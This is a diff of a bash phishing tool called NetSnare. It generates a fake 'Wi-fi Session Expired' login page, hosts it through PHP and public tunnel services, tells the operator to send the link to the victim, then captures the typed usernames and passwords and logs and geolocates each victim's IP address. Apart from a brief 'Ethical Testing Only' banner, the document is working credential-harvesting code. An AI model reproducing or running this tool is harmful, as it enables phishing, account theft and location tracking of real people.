+    echo "┃    ┃    ┃    ┃    ┃ NetSnare v1.0.0 (Quantum Beta)"
+    echo "┣━━━━┻━━━━┻━━━━┻━━━━┫"
+    echo "┃ Architect: Jayansh"
+    echo "┃ Insta: @a_lonely_ooo"
+    echo "┃ GitHub: a-lonely-ooo"
+    echo "┃ Traps: 50+ Cyber Modules"
+    echo "┗━━━━━━━━━━━━━━━━━━━━┛"
+    printf "${clear}"
+    printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Ethical Testing Only${clear}\n"
+    printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Unauthorized Use Forbidden${clear}\n"
+    printf "\n"
 }
+
 smallbanner() {
-clear
-printf "\e[1;31m╔═╗─╔╗─────╔╗─╔═══╗\e[0m\n"
-printf "\e[1;32m║║╚╗║║────╔╝╚╗║╔═╗║\e[0m\n"
-printf "\e[1;33m║╔╗╚╝║╔══╗╚╗╔╝║╚══╗╔═╗─╔══╗╔═╗╔══╗\e[0m\n"
-printf "\e[1;34m║║╚╗║║║║═╣─║║─╚══╗║║╔╗╗║╔╗║║╔╝║║═╣\e[0m\n"
-printf "\e[1;35m║║─║║║║║═╣─║╚╗║╚═╝║║║║║║╔╗║║║─║║═╣\e[0m\n"
-printf "\e[1;36m╚╝─╚═╝╚══╝─╚═╝╚═══╝╚╝╚╝╚╝╚╝╚╝─╚══╝\e[0m\n"
-printf "\n"
+    clear
+    printf "${HotPink}"
+    echo "┳══┳"
+    echo "┃NS┃"
+    echo "┻══┻"
+    printf "${clear}"
 }
-
-
 
 createpage() {
-default_cap1="Wi-fi Session Expired , Try again"
-default_cap2="Please login again."
-default_user_text="Username:"
-default_pass_text="Password:"
-default_sub_text="Log-In"
-
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
-cap1="${cap1:-${default_cap1}}"
-
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
-cap2="${cap2:-${default_cap2}}"
-
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
-user_text="${user_text:-${default_user_text}}"
-
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
-pass_text="${pass_text:-${default_pass_text}}"
-
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
-sub_text="${sub_text:-${default_sub_text}}"
-
-echo "<!DOCTYPE html>" > sites/create/login.html
-echo "<html>" >> sites/create/login.html
-echo "<head>" >> sites/create/login.html
-printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
-IFS=$'\n'
-printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
-IFS=$'\n'
-printf '<link rel="stylesheet" href="style.css"/>' >> sites/create/login.html
-IFS=$'\n'
-printf '<link rel="stylesheet" href="cookieconsent.min.css"/>' >> sites/create/login.html
-IFS=$'\n'
-printf '  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>' >> sites/create/login.html
-IFS=$'\n'
-printf '  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>' >> sites/create/login.html
-IFS=$'\n'
-  printf '<!-- Add boot strap framrworks -->' >> sites/create/login.html
-  IFS=$'\n'
-  	printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">' >> sites/create/login.html
-  	IFS=$'\n'
-printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="./style.css">' >> sites/create/login.html
-IFS=$'\n'
-  printf '<!-- Add icon library -->' >> sites/create/login.html
-  IFS=$'\n'
-printf '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">' >> sites/create/login.html
-IFS=$'\n'
-echo "</head>" >> sites/create/login.html
-printf '<body bgcolor="gray" text="white">' >> sites/create/login.html
-IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
-IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
-IFS=$'\n'
-printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
-IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
-IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
-IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
-printf '</center>' >> sites/create/login.html
-printf '<body>\n' >> sites/create/login.html
-printf '</html>\n' >> sites/create/login.html
-
-
+    default_cap1="Wi-fi Session Expired, Try Again"
+    default_cap2="Please Login Again"
+    default_user_text="Username:"
+    default_pass_text="Password:"
+    default_sub_text="Log-In"
+    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Title 1 (Default: Wi-fi Session Expired): ${clear}' cap1
+    cap1="${cap1:-${default_cap1}}"
+    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Title 2 (Default: Please Login Again): ${clear}' cap2
+    cap2="${cap2:-${default_cap2}}"
+    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Username Field (Default: Username): ${clear}' user_text
+    user_text="${user_text:-${default_user_text}}"
+    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Password Field (Default: Password): ${clear}' pass_text
+    pass_text="${pass_text:-${default_pass_text}}"
+    read -p $'\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Submit Field (Default: Log-In): ${clear}' sub_text
+    sub_text="${sub_text:-${default_sub_text}}"
+    echo "<!DOCTYPE html>" > sites/create/login.html
+    echo "<html>" >> sites/create/login.html
+    echo "<head>" >> sites/create/login.html
+    printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link rel="stylesheet" href="style.css"/>' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link rel="stylesheet" href="cookieconsent.min.css"/>' >> sites/create/login.html
+    IFS=$'\n'
+    printf '  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>' >> sites/create/login.html
+    IFS=$'\n'
+    printf '  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<!-- Add boot strap frameworks -->' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="./style.css">' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<!-- Add icon library -->' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">' >> sites/create/login.html
+    IFS=$'\n'
+    echo "</head>" >> sites/create/login.html
+    printf '<body bgcolor="gray" text="white">' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+    IFS=$'\n'
+    printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+    IFS=$'\n'
+    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+    IFS=$'\n'
+    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+    IFS=$'\n'
+    printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
+    printf '</center>' >> sites/create/login.html
+    printf '<body>\n' >> sites/create/login.html
+    printf '</html>\n' >> sites/create/login.html
 }
 
 catch_cred() {
-
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
-IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-killall -2 php > /dev/null 2>&1
-kill $(lsof -t -i :5555)
-exit 1
-
+    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+    IFS=$'\n'
+    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Account: ${BWhite}%s${clear}\n" $account
+    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Password: ${BWhite}%s${clear}\n" $password
+    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}sites/%s/saved.usernames.txt${clear}\n" $server
+    killall -2 php > /dev/null 2>&1
+    kill $(lsof -t -i :5555)
+    exit 1
 }
 
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Awaiting credentials ...\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
-catch_cred
-
-fi
-sleep 1
-done 
-
-
+    printf "${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Quantum Trap Data...${clear}\n"
+    while [ true ]; do
+        if [[ -e "sites/$server/usernames.txt" ]]; then
+            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Trap Triggered!${clear}\n"
+            catch_cred
+        fi
+        sleep 1
+    done
 }
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
-
-
-if [[ -e iptracker.log ]]; then
-rm -rf iptracker.log
-fi
-
-IFS='\n'
-iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
-IFS=$'\n'
-continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-printf "\n"
-hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
-if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
-fi
-##
-
-reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
-if [[ $reverse_dns != "" ]]; then
-printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-fi
-##
-
-
-if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-fi
-##
-
-country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-fi
-##
-
-state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-if [[ $state != "" ]]; then
-printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
-fi
-##
-city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-fi
-##
-
-isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $isp != "" ]]; then
-printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-fi
-##
-
-as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $as_number != "" ]]; then
-printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
-fi
-##
-
-ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $ip_speed != "" ]]; then
-printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
-fi
-##
-ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-fi
-##
-printf "\n"
-rm -rf iptracker.log
-
-getcredentials
+    touch sites/$server/saved.usernames.txt
+    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Victim IP: ${BWhite}%s${clear}\n" $ip
+    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} User-Agent: ${BWhite}%s${clear}\n" $ua
+    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}%s/saved.ip.txt${clear}\n" $server
+    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+    if [[ -e iptracker.log ]]; then
+        rm -rf iptracker.log
+    fi
+    IFS='\n'
+    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+    IFS=$'\n'
+    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+    printf "\n"
+    hostnameip=$(grep -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+    if [[ $hostnameip != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Hostname: ${BWhite}%s${clear}\n" $hostnameip
+    fi
+    reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+    if [[ $reverse_dns != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Reverse DNS: ${BWhite}%s${clear}\n" $reverse_dns
+    fi
+    if [[ $continent != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Continent: ${BWhite}%s${clear}\n" $continent
+    fi
+    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+    if [[ $country != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Country: ${BWhite}%s${clear}\n" $country
+    fi
+    state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+    if [[ $state != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} State: ${BWhite}%s${clear}\n" $state
+    fi
+    city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $city != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} City Location: ${BWhite}%s${clear}\n" $city
+    fi
+    isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $isp != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} ISP: ${BWhite}%s${clear}\n" $isp
+    fi
+    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $as_number != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} AS Number: ${BWhite}%s${clear}\n" $as_number
+    fi
+    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $ip_speed != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Address Speed: ${BWhite}%s${clear}\n" $ip_speed
+    fi
+    ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $ip_currency != "" ]]; then
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} IP Currency: ${BWhite}%s${clear}\n" $ip_currency
+    fi
+    printf "\n"
+    rm -rf iptracker.log
+    getcredentials
 }
 
 start() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
-
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
-
-fi
-
+    if [[ -e sites/$server/ip.txt ]]; then
+        rm -rf sites/$server/ip.txt
+    fi
+    if [[ -e sites/$server/usernames.txt ]]; then
+        rm -rf sites/$server/usernames.txt
+    fi
 }
+
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf sites/"$website"/* .NetSnare/www
-	cp -f sites/ip.php .NetSnare/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .NetSnare/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+    echo -e "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Configuring Quantum Server...${clear}"
+    cp -rf sites/"$website"/* .NetSnare/www
+    cp -f sites/ip.php .NetSnare/www/
+    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Activating PHP Matrix...${clear}"
+    cd .NetSnare/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
-
 
 tunnel_menu() {
-
-if [[ -e .nexlink ]]; then
-rm -rf .nexlink
-fi
-
-if [[ -d .NetSnare/www ]]; then
-rm -rf .NetSnare/www
-mkdir .NetSnare/www
-else
-mkdir .NetSnare/www
-fi
-
-cp -rf sites/$website/* .NetSnare/www
-cp -f sites/ip.php .NetSnare/www/
-
-def_tunnel_menu="2"
-smallbanner
-printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
-printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m CloudFlare \e[0m\n"
-printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalTunnel \e[0m\e[91m[\e[0m\e[93mNEW\e[0m\e[91m]\e[0m\n"
-printf "\e[0m\e[91m [\e[0m00\e[0m\e[91m]\e[0m\e[93m Go Back\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
-tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
-
-if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
-start_localhost
-elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
-start_loclx
-elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
-start_cloudflare
-elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
-start_localtunnel
-elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
-go_back
-
-else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-clear
-banner
-menu
-fi
-
+    if [[ -e .nexlink ]]; then
+        rm -rf .nexlink
+    fi
+    if [[ -d .NetSnare/www ]]; then
+        rm -rf .NetSnare/www
+        mkdir .NetSnare/www
+    else
+        mkdir .NetSnare/www
+    fi
+    cp -rf sites/$website/* .NetSnare/www
+    cp -f sites/ip.php .NetSnare/www/
+    def_tunnel_menu="2"
+    smallbanner
+    printf "${NeonBlue}┳════┤ ${BHotPink}Port Forwarding Matrix${NeonBlue} ├════┓${clear}\n"
+    printf "${NeonBlue}┃${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} LocalHost${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} LocalXpose${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} CloudFlare${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} LocalTunnel${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[00]${AcidGreen} Back${clear}\n"
+    printf "${NeonBlue}┃${clear}\n"
+    printf "${NeonBlue}┗════┤ ${BHotPink}Select Option [00-04]${NeonBlue} ├════┛${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' tunnel_menu
+    tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
+    if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
+        start_localhost
+    elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
+        start_loclx
+    elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
+        start_cloudflare
+    elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
+        start_localtunnel
+    elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
+        go_back
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Option${clear}\n"
+        sleep 1
+        clear
+        banner
+        menu
+    fi
 }
+
 go_back() {
-	clear
-	banner
-	menu
+    clear
+    banner
+    menu
 }
 
 start_cloudflare() {
-	
-	echo -ne "\n${RED} [${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
-	sleep 1
-	rm .cld.log > /dev/null 2>&1 &
-	echo ""
-			cusport
-			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing....${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-			{ sleep 1; setup_site; }
-			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared...."
-
-			if [[ `command -v termux-chroot` ]]; then
-				sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-			else
-				sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-			fi
-
-			sleep 8
-			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-
-			if [ -z "$cldflr_url" ]; then
-        		echo -e "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m\e[1;91m Failed to create a link to send.\e[0m\n"
-        		exit 1
-    		else
-        		smallbanner
-        		printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $cldflr_url
-
-        		datafound
-			fi
-}
-
-start_localhost() {
-
-printf "\e[0m\n"
-cusport
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://${HOST}:${PORT} \e[0m\e[1;92m)\e[0m\n"
-setup_site 
-sleep 1
-smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at:\e[0m\e[1;93m http://$HOST:$PORT\e[0m\n"
-
-datafound
-
-}
-
-start_localtunnel() {
-    printf "\e[0m\n"
-    if ! command -v lt &> /dev/null; then
-        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m LocalTunnel is not installed. Install it... \e[0m\n"
-        exit 1
+    echo -ne "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Activating Cloudflared Matrix...${clear}"
+    sleep 1
+    rm .cld.log > /dev/null 2>&1 &
+    echo ""
+    cusport
+    echo -e "\n${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://$HOST:$PORT${clear}"
+    { sleep 1; setup_site; }
+    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Launching Cloudflared Tunnel...${clear}"
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
     fi
-
-	cusport
-    printf "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Starting Local Web Server...\e[0m\n"
-    { sleep 3; setup_site; }
-
-    printf "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Using Localtunnel to create a public link for your local web server...\e[0m\e[91m\n[\e[0m\e[93mThis will take some time for it to start, Please be patient or go do something else \e[0m\e[91m]\e[0m\n"
-    sleep 5
-    url=$(lt --port 5555 --print-requests --log debug | grep -o 'https://.*$')
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Shortening the Localtunnel URL...\e[0m\n"
-    sleep 3
-    short_url=$(curl -s -X POST -d "url=$url" https://tinyurl.com/api-create.php)
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Sending a GET request to the Localtunnel URL with the bypass-tunnel-header...\e[0m\n"
-    sleep 2
-    curl -H "bypass-tunnel-reminder: true" $url
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Making it shareable to victim...\e[0m\n"
-    sleep 3
-    if [ -z "$url" ]; then
-        echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m\e[1;91m Failed to create a link to send.\e[0m\n"
+    sleep 12
+    cldflr_url=$(grep -o 'https://[a-zA-Z0-9.-]\+\.trycloudflare\.com' ".server/.cld.log")
+    if [[ -z "$cldflr_url" ]]; then
+        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Establish Tunnel${clear}"
+        echo -e "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Debug: Check Cloudflared binary and network${clear}"
         exit 1
     else
         smallbanner
-        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $url
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $cldflr_url
+        datafound
+    fi
+}
 
-        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Short URL: \e[0m\e[1;93m %s \n"$short_url
-    
+start_localhost() {
+    printf "\n"
+    cusport
+    printf "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://${HOST}:${PORT}${clear}\n"
+    setup_site
+    sleep 1
+    smallbanner
+    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Hosted at: ${BWhite}http://$HOST:$PORT${clear}\n"
